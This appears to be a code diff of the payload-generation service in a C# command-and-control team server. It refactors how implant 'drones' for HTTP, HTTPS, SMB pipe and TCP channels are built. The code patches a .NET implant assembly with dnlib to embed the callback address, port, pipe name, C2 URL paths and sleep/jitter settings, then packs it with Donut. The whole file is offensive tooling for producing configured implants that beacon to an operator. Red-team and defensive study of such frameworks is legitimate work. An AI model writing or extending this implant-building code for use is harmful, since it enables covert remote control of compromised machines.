@@ -8,6 +8,7 @@ using dnlib.PE;
 using Donut;
 using Donut.Structs;
 
+using TeamServer.C2Profiles;
 using TeamServer.Handlers;
 using TeamServer.Interfaces;
 using TeamServer.Utilities;
@@ -25,63 +26,19 @@ public class PayloadService : IPayloadService
 
     public async Task<byte[]> GeneratePayload(Handler handler, PayloadFormat format)
     {
-        byte[] drone;
-
         // generate the assembly
-        switch (handler.PayloadType)
+        var drone = handler.PayloadType switch
         {
-            case PayloadType.HTTP:
-            {
-                var httpHandler = (HttpHandler)handler;
-                drone = await GenerateHttpDrone(httpHandler.ConnectAddress, httpHandler.ConnectPort);
-                
-                break;
-            }
+            PayloadType.HTTP => await GenerateHttpDrone((HttpHandler)handler),
+            PayloadType.HTTPS => await GenerateHttpsDrone((HttpHandler)handler),
+            PayloadType.BIND_PIPE => await GenerateBindSmbDrone((SmbHandler)handler),
+            PayloadType.BIND_TCP => await GenerateBindTcpDrone((TcpHandler)handler),
+            PayloadType.REVERSE_TCP => await GenerateReverseTcpDrone((TcpHandler)handler),
+            PayloadType.EXTERNAL => await GenerateBindSmbDrone((SmbHandler)handler),
 
-            case PayloadType.HTTPS:
-            {
-                var httpsHandler = (HttpHandler)handler;
-                drone = await GenerateHttpsDrone(httpsHandler.ConnectAddress, httpsHandler.ConnectPort);
-                
-                break;
-            }
+            _ => throw new ArgumentOutOfRangeException()
+        };
 
-            case PayloadType.BIND_PIPE:
-            {
-                var smbHandler = (SmbHandler)handler;
-                drone = await GenerateBindSmbDrone(smbHandler.PipeName);
-                
-                break;
-            }
-
-            case PayloadType.BIND_TCP:
-            {
-                var bindTcpHandler = (TcpHandler)handler;
-                drone = await GenerateBindTcpDrone(bindTcpHandler.Port, bindTcpHandler.Loopback);
-                
-                break;
-            }
-
-            case PayloadType.REVERSE_TCP:
-            {
-                var reverseTcpHandler = (TcpHandler)handler;
-                drone = await GenerateReverseTcpDrone(reverseTcpHandler.Address, reverseTcpHandler.Port);
-                
-                break;
-            }
-
-            case PayloadType.EXTERNAL:
-            {
-                var smbHandler = (SmbHandler)handler;
-                drone = await GenerateBindSmbDrone(smbHandler.PipeName);
-                
-                break;
-            }
-            
-            default:
-                throw new ArgumentOutOfRangeException();
-        }
-        
         // convert to correct format
         return format switch
         {
@@ -96,7 +53,7 @@ public class PayloadService : IPayloadService
         };
     }
 
-    private async Task<byte[]> GenerateHttpDrone(string connectAddress, int connectPort)
+    private async Task<byte[]> GenerateHttpDrone(HttpHandler handler)
     {
         var drone = await GetDroneModule();
         
@@ -109,11 +66,18 @@ public class PayloadService : IPayloadService
         
         // set connect address
         var connectAddressDef = GetMethodDef(httpCommModuleDef, "System.String Drone.CommModules.HttpCommModule::get_ConnectAddress()");
-        connectAddressDef.Body.Instructions[0].Operand = connectAddress;
+        connectAddressDef.Body.Instructions[0].Operand = handler.ConnectAddress;
         
         // set connect port
         var connectPortDef = GetMethodDef(httpCommModuleDef, "System.String Drone.CommModules.HttpCommModule::get_ConnectPort()");
-        connectPortDef.Body.Instructions[0].Operand = connectPort.ToString();
+        connectPortDef.Body.Instructions[0].Operand = handler.ConnectPort.ToString();
+        
+        // set uris
+        EmbedUrlPaths(httpCommModuleDef, handler.C2Profile);
+        
+        // set sleep/jitter
+        var configDef = GetTypeDef(drone, "Drone.Config");
+        EmbedSleepJitter(configDef, handler.C2Profile);
         
         await using var ms = new MemoryStream();
         drone.Write(ms);
@@ -121,7 +85,7 @@ public class PayloadService : IPayloadService
         return ms.ToArray();
     }
     
-    private async Task<byte[]> GenerateHttpsDrone(string connectAddress, int connectPort)
+    private async Task<byte[]> GenerateHttpsDrone(HttpHandler handler)
     {
         var drone = await GetDroneModule();
         
@@ -134,11 +98,18 @@ public class PayloadService : IPayloadService
         
         // set connect address
         var connectAddressDef = GetMethodDef(httpCommModuleDef, "System.String Drone.CommModules.HttpCommModule::get_ConnectAddress()");
-        connectAddressDef.Body.Instructions[0].Operand = connectAddress;
+        connectAddressDef.Body.Instructions[0].Operand = handler.ConnectAddress;
         
         // set connect port
         var connectPortDef = GetMethodDef(httpCommModuleDef, "System.String Drone.CommModules.HttpCommModule::get_ConnectPort()");
-        connectPortDef.Body.Instructions[0].Operand = connectPort.ToString();
+        connectPortDef.Body.Instructions[0].Operand = handler.ConnectPort.ToString();
+        
+        // set uris
+        EmbedUrlPaths(httpCommModuleDef, handler.C2Profile);
+        
+        // set sleep/jitter
+        var configDef = GetTypeDef(drone, "Drone.Config");
+        EmbedSleepJitter(configDef, handler.C2Profile);
         
         await using var ms = new MemoryStream();
         drone.Write(ms);
@@ -146,7 +117,25 @@ public class PayloadService : IPayloadService
         return ms.ToArray();
     }
 
-    private async Task<byte[]> GenerateBindSmbDrone(string pipeName)
+    private static void EmbedSleepJitter(TypeDef configDif, C2Profile profile)
+    {
+        var sleepDef = GetMethodDef(configDif, "System.Int32 Drone.Config::get_SleepTime()");
+        var jitterDef = GetMethodDef(configDif, "System.Int32 Drone.Config::get_SleepJitter()");
+
+        sleepDef.Body.Instructions[0].Operand = profile.Http.Sleep.ToString();
+        jitterDef.Body.Instructions[0].Operand = profile.Http.Jitter.ToString();
+    }
+
+    private static void EmbedUrlPaths(TypeDef handlerDef, C2Profile profile)
+    {
+        var getPathsDef = GetMethodDef(handlerDef, "System.String Drone.CommModules.HttpCommModule::get_GetPaths()");
+        var postPathsDef = GetMethodDef(handlerDef, "System.String Drone.CommModules.HttpCommModule::get_PostPaths()");
+
+        getPathsDef.Body.Instructions[0].Operand = string.Join(';', profile.Http.GetPaths);
+        postPathsDef.Body.Instructions[0].Operand = string.Join(';', profile.Http.PostPaths);
+    }
+
+    private async Task<byte[]> GenerateBindSmbDrone(SmbHandler handler)
     {
         var drone = await GetDroneModule();
         
@@ -155,7 +144,7 @@ public class PayloadService : IPayloadService
         
         // set pipename
         var pipeNameDef = GetMethodDef(smbCommModuleDef, "System.String Drone.CommModules.SmbCommModule::get_PipeName()");
-        pipeNameDef.Body.Instructions[0].Operand = pipeName;
+        pipeNameDef.Body.Instructions[0].Operand = handler.PipeName;
         
         // get main comm module
         var droneDef = GetTypeDef(drone, "Drone.Drone");
@@ -173,7 +162,7 @@ public class PayloadService : IPayloadService
         return ms.ToArray();
     }
 
-    private async Task<byte[]> GenerateBindTcpDrone(int bindPort, bool loopback)
+    private async Task<byte[]> GenerateBindTcpDrone(TcpHandler handler)
     {
         var drone = await GetDroneModule();
         
@@ -182,11 +171,11 @@ public class PayloadService : IPayloadService
 
         // set port
         var portDef = GetMethodDef(tcpCommModuleDef, "System.Int32 Drone.CommModules.TcpCommModule::get_BindPort()");
-        portDef.Body.Instructions[0].Operand = bindPort.ToString();
+        portDef.Body.Instructions[0].Operand = handler.Port.ToString();
         
         // set loopback
         var loopbackDef = GetMethodDef(tcpCommModuleDef, "System.Boolean Drone.CommModules.TcpCommModule::get_Loopback()");
-        loopbackDef.Body.Instructions[0].OpCode = loopback ? OpCodes.Ldc_I4_1 : OpCodes.Ldc_I4_0;
+        loopbackDef.Body.Instructions[0].OpCode = handler.Loopback ? OpCodes.Ldc_I4_1 : OpCodes.Ldc_I4_0;
         
         // get main comm module
         var droneDef = GetTypeDef(drone, "Drone.Drone");
@@ -204,7 +193,7 @@ public class PayloadService : IPayloadService
         return ms.ToArray();
     }
 
-    private async Task<byte[]> GenerateReverseTcpDrone(string connectAddress, int connectPort)
+    private Task<byte[]> GenerateReverseTcpDrone(TcpHandler handler)
     {
         throw new NotImplementedException();
     }
